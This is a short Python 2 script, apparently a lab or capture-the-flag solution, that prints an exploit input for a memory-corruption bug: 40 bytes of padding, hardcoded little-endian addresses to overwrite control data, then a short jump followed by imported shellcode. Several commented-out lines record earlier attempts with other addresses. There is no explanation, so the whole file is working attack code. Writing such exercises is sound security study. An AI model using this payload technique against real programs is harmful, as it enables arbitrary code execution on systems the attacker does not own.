from shellcode import shellcode
from struct import pack

print 'A'*32 + 'A'*8
print 'A'*32 + 'A'*8 + pack("<I", 0x80f3780) +pack("<I", 0xBFFEFD4C)
print  '\xEB\x06' + 'A'*6 + shellcode



#print 'A'*32 + 'A'*8 + pack("<I", 0xbffefd48) + pack("<I", 0x80f3784)
#print 'A'*32 + 'A'*8 + pack("<I", 0xbffefd48) + pack("<I", 0x80f3780)
#print pack("<I", 0x0f1f4000) + shellcode


#print 'A'*32
#+ pack("<I", 0xbffefd48) + shellcode + 'A'*17 
#print 'A'*32 + 'A'*8 + pack("<I", 0xBFFEFD3C) + pack("<I", 0x80b3788)
#print shellcode
